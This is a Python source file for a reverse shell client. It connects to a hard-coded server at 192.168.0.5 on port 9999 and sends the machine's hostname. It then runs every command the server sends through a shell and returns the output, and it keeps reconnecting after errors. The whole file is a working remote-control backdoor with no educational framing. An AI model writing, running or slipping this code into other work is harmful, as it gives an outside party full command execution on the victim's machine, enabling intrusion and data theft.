import os
import socket
import subprocess
import time
import struct


class Client(object):

    def __init__(self):
        # self.serverHost = '192.168.1.9'
        self.serverHost = '192.168.0.5'
        self.serverPort = 9999
        self.socket = None

    def socket_create(self):
        """ Create a socket """
        try:
            self.socket = socket.socket()
        except socket.error as e:
            print("Socket creation error" + str(e))
            return

    def socket_connect(self):
        """ Connect to a remote socket """
        try:
            self.socket.connect((self.serverHost, self.serverPort))
        except socket.error as e:
            print("Socket connection error: " + str(e))
            time.sleep(5)
            self.socket_connect()
        try:
            self.socket.send(str.encode(socket.gethostname()))
        except socket.error as e:
            print("Cannot send hostname to server: " + str(e))
            time.sleep(5)
            self.socket_connect()
        return

    def receive_commands(self):
        """ Receive commands from remote server and run on local machine """
        self.socket.recv(10)
        cwd = str.encode(str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(cwd)) + cwd)
        while True:
            data = self.socket.recv(20480)
            if data[:2].decode("utf-8") == 'cd':
                try:
                    os.chdir(data[3:].decode("utf-8"))
                except:
                    pass
            if data[:].decode("utf-8") == 'quit':
                self.socket.close()
                break
            if len(data) > 0:
                try:
                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_bytes.decode("utf-8", errors="replace")
                    sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
                    self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
                    print(output_str)
                except:
                    # TODO: Error description is lost
                    output_str = "Command not recognized" + "\n"
                    self.socket.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
        self.socket.close()


def main():
    client = Client()
    client.socket_create()
    client.socket_connect()
    try:
        client.receive_commands()
    except Exception as e:
        print('Error in main: ' + str(e))
        time.sleep(5)
    client.socket.close()
    main()


if __name__ == '__main__':
    main()
